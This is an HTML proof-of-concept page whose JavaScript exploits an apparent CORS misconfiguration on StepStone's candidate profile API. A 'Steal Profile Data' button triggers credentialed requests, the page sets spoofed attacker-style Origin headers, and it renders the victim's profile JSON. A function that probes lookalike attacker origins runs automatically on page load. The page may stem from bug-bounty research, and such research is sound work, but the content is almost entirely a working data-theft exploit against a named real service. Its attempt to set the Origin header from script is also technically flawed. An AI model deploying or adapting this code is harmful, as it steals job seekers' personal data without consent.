<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit PoC - StepStone</title>
</head>
<body>
    <h1>CORS Misconfiguration Exploit</h1>
    <button onclick="exploit()">Steal Profile Data</button>
    <div id="result"></div>

    <script>
    async function exploit() {
        const resultDiv = document.getElementById('result');
        resultDiv.innerHTML = '<p>Attempting to steal profile data...</p>';
        
        try {
            // First, let's try without additional headers to see what happens
            const response = await fetch('https://www.stepstone.de/candidate/profile/editor/api/v1/profile', {
                method: 'GET',
                credentials: 'include', // This sends cookies
                headers: {
                    'Origin': 'https://www.stepstone.de.i-am-hunter.xyz',
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                    // Note: We're NOT including X-Csrf-Token to see if it works without it
                }
            });

            console.log('Response headers:', Object.fromEntries(response.headers.entries()));
            
            const acao = response.headers.get('Access-Control-Allow-Origin');
            const acac = response.headers.get('Access-Control-Allow-Credentials');
            
            resultDiv.innerHTML = `
                <h3>CORS Headers:</h3>
                <p>Access-Control-Allow-Origin: <strong style="color: red">${acao}</strong></p>
                <p>Access-Control-Allow-Credentials: <strong style="color: red">${acac}</strong></p>
                <p>Status: <strong>${response.status} ${response.statusText}</strong></p>
            `;

            if (response.ok) {
                const data = await response.json();
                resultDiv.innerHTML += `
                    <h3 style="color: red">ðŸš¨ EXPLOIT SUCCESSFUL - Profile Data Stolen:</h3>
                    <div style="background: #ffebee; padding: 15px; border: 2px solid red;">
                        <pre>${JSON.stringify(data, null, 2)}</pre>
                    </div>
                `;
            } else {
                resultDiv.innerHTML += `
                    <p>Response not OK. Let's try to read the error:</p>
                    <pre>${await response.text()}</pre>
                `;
            }

        } catch (error) {
            resultDiv.innerHTML = `<p style="color: red">Error: ${error.message}</p>`;
        }
    }

    // Test multiple origins to find which ones work
    async function testAllOrigins() {
        const origins = [
            'https://www.stepstone.de.i-am-hunter.xyz',
            'https://stepstone.de.i-am-hunter.xyz',
            'https://www.stepstone.de.attacker.com',
            'https://stepstone.de.attacker.com',
            'https://attacker-stepstone.de.com'
        ];

        for (const origin of origins) {
            try {
                const response = await fetch('https://www.stepstone.de/candidate/profile/editor/api/v1/profile', {
                    method: 'GET',
                    credentials: 'include',
                    headers: { 'Origin': origin }
                });
                
                console.log(`Origin: ${origin}`, {
                    ACAO: response.headers.get('Access-Control-Allow-Origin'),
                    Status: response.status
                });
            } catch (e) {
                console.log(`Origin: ${origin} - Error: ${e.message}`);
            }
        }
    }

    // Run origin tests
    testAllOrigins();
    </script>
</body>
</html>
